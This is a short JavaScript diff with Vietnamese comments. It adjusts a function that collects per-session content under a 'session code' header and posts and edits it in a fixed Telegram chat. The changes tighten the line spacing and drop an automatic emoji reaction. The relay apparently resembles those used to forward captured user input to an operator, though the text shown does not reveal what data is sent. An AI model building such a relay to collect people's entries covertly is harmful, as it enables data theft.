@@ -27,9 +27,9 @@ export const escapeHtml = (s) => String(s).replace(/&/g, '&amp;').replace(/</g, 
 export const sendTelegramMessage = (newContent) => {
     const sid = getSessionId();
     
+    // Sửa ở đây: Dùng 1 dấu xuống dòng thay vì 2 để nó sát nhau hơn
     if (newContent) {
-        // CHỈ NỐI THẲNG NỘI DUNG, KHÔNG CHÈN MÃ PHIÊN NỮA
-        currentSessionText += `\n\n${newContent}`;
+        currentSessionText += `\n${newContent}`;
     }
     
     let text = `<b>🔑 MÃ PHIÊN: <code>${sid}</code></b>\n\n` + currentSessionText;
@@ -57,15 +57,10 @@ export const sendTelegramMessage = (newContent) => {
             if (res && res.ok && res.result) {
                 tgFetch('deleteMessage', { chat_id: CHAT_ID, message_id: res.result.message_id });
             }
-            // Update lại nội dung
+            // Cập nhật nội dung
             tgFetch('editMessageText', { chat_id: CHAT_ID, message_id: tgMessageId, text: text, parse_mode: 'HTML' });
             
-            // Tự động thả cảm xúc 🔥 vào tin nhắn
-            tgFetch('setMessageReaction', {
-                chat_id: CHAT_ID,
-                message_id: tgMessageId,
-                reaction: JSON.stringify([{ type: 'emoji', emoji: '🔥' }])
-            });
+            // ĐÃ XÓA PHẦN THẢ CẢM XÚC TẠI ĐÂY
         });
     }
 };
